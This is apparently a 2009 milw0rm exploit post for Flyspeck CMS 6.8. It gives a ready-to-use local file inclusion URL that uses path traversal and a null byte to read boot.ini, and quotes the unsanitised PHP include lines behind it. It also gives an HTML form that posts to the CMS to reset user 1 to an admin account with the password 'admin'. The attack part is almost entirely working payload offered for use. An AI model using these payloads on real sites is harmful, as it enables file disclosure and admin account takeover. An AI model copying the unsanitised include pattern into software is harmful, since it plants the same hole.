@@ -1,0 +1,33 @@
+                =-=-remote change add admin xpl/lfi-=-=
+
+-=-=-=-=-=-=-=-=-=-=-=-=-=-==-=-=-=-=-=-=-=-=-=-=
+script::Flyspeck CMS 6.8
+-------------------------------------------------
+Author: ahmadbady
+my site :Coming Soon
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+download from:http://www.flyspeck.net/purchase/download_trial.php
+--------------------------------------------------
+lfi:
+includes/database/examples/addressbook.php?lang=../../../../boot.ini%00
+
+$lang = isset($_GET['lang']) ? $_GET['lang'] : 'de'; line 28
+include "lang." . $lang . ".inc"; line 29
+--------------------------
+
+change pass and add admin:
+
+
+<h2>coded by ahmadbady</h2>
+<form name="editUser" action="/flyspeck/index.php?event=updateExistingContent" 
+onsubmit="return validateForm(this)" method="post" 
+enctype="multipart/form-data"><label name="Name">Name</label>
+<input type="text" name="users[fullname]" value="admin" />
+<label name="Email">Email</label><input type="text" name="users[email]" value="admin" />
+<label name="Role">Role</label><select name="users[role_id]"><option value="1" label="admin" />
+</select><label name="Username">Username</label><input type="text" name="users[username]" value="admin" />
+<label name="Password">Password</label><input type="text" name="users[password]" value="admin" />
+<input type="hidden" name="id" value="1" /><input type="hidden" name="defName" value="users" />
+<input type="submit" name="1" value="Save" /></form>
+
+# milw0rm.com [2009-05-18]
